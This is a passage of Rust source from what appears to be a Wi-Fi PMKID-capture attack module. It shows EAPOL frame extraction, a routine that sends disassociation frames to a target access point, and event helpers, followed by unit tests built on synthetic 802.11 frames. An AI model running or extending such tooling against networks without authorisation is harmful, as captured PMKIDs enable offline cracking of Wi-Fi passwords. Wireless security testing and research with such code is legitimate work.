        if eapol_off < frame.raw.len() {
            return Some(frame.raw[eapol_off..].to_vec());
        }
    }
    None
}

/// Send disassociation frame (cleanup — be polite to the AP).
fn disassoc_cleanup(
    shared: &SharedAdapter,
    our_mac: &MacAddress,
    target: &Ap,
    params: &PmkidParams,
    events: &Arc<EventRing<PmkidEvent>>,
    attack_start: Instant,
    info: &Arc<Mutex<PmkidInfo>>,
) {
    if !params.disassoc_after {
        return;
    }

    update_phase(info, PmkidPhase::Cleanup);

    let disassoc = frames::build_disassoc(
        our_mac,
        &target.bssid,
        &target.bssid,
        ReasonCode::DisassocLeaving,
    );

    if shared.tx_frame(&disassoc, &TxOptions::default()).is_ok() {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.frames_sent += 1;
    }

    push_event(events, attack_start, PmkidEventKind::DisassocSent {
        bssid: target.bssid,
    });
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════════════════════════

fn push_event(
    events: &Arc<EventRing<PmkidEvent>>,
    start: Instant,
    kind: PmkidEventKind,
) {
    let seq = events.seq() + 1;
    events.push(PmkidEvent {
        seq,
        timestamp: start.elapsed(),
        kind,
    });
}

fn push_target_complete(
    events: &Arc<EventRing<PmkidEvent>>,
    start: Instant,
    result: &PmkidResult,
) {
    push_event(events, start, PmkidEventKind::TargetComplete {
        bssid: result.bssid,
        ssid: result.ssid.clone(),
        status: result.status,
        elapsed_ms: result.elapsed.as_millis() as u64,
    });
}

fn update_phase(info: &Arc<Mutex<PmkidInfo>>, phase: PmkidPhase) {
    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
    info.phase = phase;
    info.elapsed = info.start_time.elapsed();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pmkid_params_default() {
        let params = PmkidParams::default();
        assert_eq!(params.auth_timeout, Duration::from_millis(500));
        assert_eq!(params.assoc_timeout, Duration::from_millis(500));
        assert_eq!(params.m1_timeout, Duration::from_millis(2000));
        assert_eq!(params.retry_delay, Duration::from_millis(100));
        assert_eq!(params.channel_settle, Duration::from_millis(50));
        assert_eq!(params.timeout, Duration::ZERO);
        assert_eq!(params.auth_retries, 3);
        assert_eq!(params.assoc_retries, 3);
        assert_eq!(params.max_targets, 0);
        assert_eq!(params.rssi_min_dbm, -90);
        assert!(params.disassoc_after);
        assert!(!params.attack_all);
        assert!(params.bssid.is_none());
        assert!(params.ssid.is_none());
    }

    #[test]
    fn test_pmkid_info_default() {
        let info = PmkidInfo::default();
        assert_eq!(info.phase, PmkidPhase::Idle);
        assert!(!info.running);
        assert_eq!(info.pmkids_captured, 0);
        assert_eq!(info.frames_sent, 0);
        assert_eq!(info.frames_received, 0);
        assert!(info.results.is_empty());
    }

    #[test]
    fn test_pmkid_event_ring() {
        let ring = EventRing::<PmkidEvent>::new(16);
        ring.push(PmkidEvent {
            seq: 1,
            timestamp: Duration::from_millis(100),
            kind: PmkidEventKind::ChannelLocked { channel: 6 },
        });
        ring.push(PmkidEvent {
            seq: 2,
            timestamp: Duration::from_millis(200),
            kind: PmkidEventKind::AttackComplete {
                captured: 1,
                failed: 0,
                total: 1,
                elapsed: Duration::from_secs(3),
            },
        });
        let events = ring.drain();
        assert_eq!(events.len(), 2);
        assert_eq!(events[0].seq, 1);
        assert_eq!(events[1].seq, 2);
    }

    #[test]
    fn test_filter_eligible_empty() {
        let params = PmkidParams::default();
        let aps: Vec<Ap> = vec![];
        let eligible = filter_eligible_targets(&aps, &params);
        assert!(eligible.is_empty());
    }

    // Helper: create a ParsedFrame from raw bytes for testing
    fn pf(data: &[u8]) -> crate::core::ParsedFrame {
        crate::core::parsed_frame::parse_frame(data, -40, 6, Duration::from_millis(100))
    }

    #[test]
    fn test_is_eapol_data_frame_too_short() {
        let bssid = MacAddress::new([0x7C, 0x10, 0xC9, 0x03, 0x10, 0xE0]);
        let frame = pf(&[0x08, 0x00]);
        assert!(!is_eapol_data_frame(&frame, &bssid));
    }

    #[test]
    fn test_is_eapol_data_frame_management() {
        let bssid = MacAddress::new([0x7C, 0x10, 0xC9, 0x03, 0x10, 0xE0]);
        let frame = pf(&vec![0x80; 50]);
        assert!(!is_eapol_data_frame(&frame, &bssid));
    }

    #[test]
    fn test_is_eapol_data_frame_valid() {
        let bssid = MacAddress::new([0x7C, 0x10, 0xC9, 0x03, 0x10, 0xE0]);
        let sta = MacAddress::new([0x8C, 0x88, 0x2B, 0x01, 0x02, 0x03]);

        let mut data = vec![0u8; 24 + 8 + 4];
        data[0] = 0x08;
        data[1] = 0x02;
        data[4..10].copy_from_slice(sta.as_bytes());
        data[10..16].copy_from_slice(bssid.as_bytes());
        data[16..22].copy_from_slice(bssid.as_bytes());
        data[24..32].copy_from_slice(&[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);

        let frame = pf(&data);
        assert!(is_eapol_data_frame(&frame, &bssid));
    }

    #[test]
    fn test_is_eapol_data_frame_qos_data() {
        let bssid = MacAddress::new([0x7C, 0x10, 0xC9, 0x03, 0x10, 0xE0]);
        let sta = MacAddress::new([0x8C, 0x88, 0x2B, 0x01, 0x02, 0x03]);

        let mut data = vec![0u8; 26 + 8 + 4];
        data[0] = 0x88; // QoS Data
        data[1] = 0x02;
        data[4..10].copy_from_slice(sta.as_bytes());
        data[10..16].copy_from_slice(bssid.as_bytes());
        data[16..22].copy_from_slice(bssid.as_bytes());
        data[24] = 0x00; data[25] = 0x00; // QoS Control
        data[26..34].copy_from_slice(&[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);

        let frame = pf(&data);
        assert!(is_eapol_data_frame(&frame, &bssid));
    }

    #[test]
    fn test_extract_eapol_from_data_frame() {
        let mut data = vec![0u8; 24 + 8 + 10];
        data[0] = 0x08;
        data[1] = 0x02;
        data[24..32].copy_from_slice(&[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);
        data[32..36].copy_from_slice(&[0x01, 0x03, 0x00, 0x75]);

        let frame = pf(&data);
        let payload = extract_eapol_from_data_frame(&frame).unwrap();
        assert_eq!(payload[0], 0x01);
        assert_eq!(payload[1], 0x03);
        assert_eq!(payload.len(), 10);
    }

    #[test]
    fn test_pmkid_status_values() {
        let status = PmkidStatus::Captured;
        assert_eq!(status, PmkidStatus::Captured);
        let status = PmkidStatus::NoPmkid;
        assert_eq!(status, PmkidStatus::NoPmkid);
    }

    #[test]
    fn test_pmkid_result_default_fields() {
        let result = PmkidResult {
            bssid: MacAddress::ZERO,
            ssid: "TestAP".to_string(),
            channel: 6,
            rssi: -42,
            status: PmkidStatus::InProgress,
            pmkid: None,
            anonce: None,
            key_version: 0,
            elapsed: Duration::ZERO,
        };
        assert_eq!(result.ssid, "TestAP");
        assert_eq!(result.channel, 6);
        assert_eq!(result.status, PmkidStatus::InProgress);
        assert!(result.pmkid.is_none());
    }

    #[test]
    fn test_pmkid_final_result_default() {
        let result = PmkidFinalResult::default();
        assert!(result.results.is_empty());
        assert_eq!(result.total_captured, 0);
        assert_eq!(result.total_failed, 0);
        assert_eq!(result.total_no_pmkid, 0);
    }

    #[test]
    fn test_pmkid_attack_new() {
        let attack = PmkidAttack::new(PmkidParams::default());
        assert!(!attack.is_running());
        assert!(!attack.is_done());
        assert_eq!(attack.name(), "pmkid");
        let info = attack.info();
        assert_eq!(info.phase, PmkidPhase::Idle);
        assert!(!info.running);
    }
}
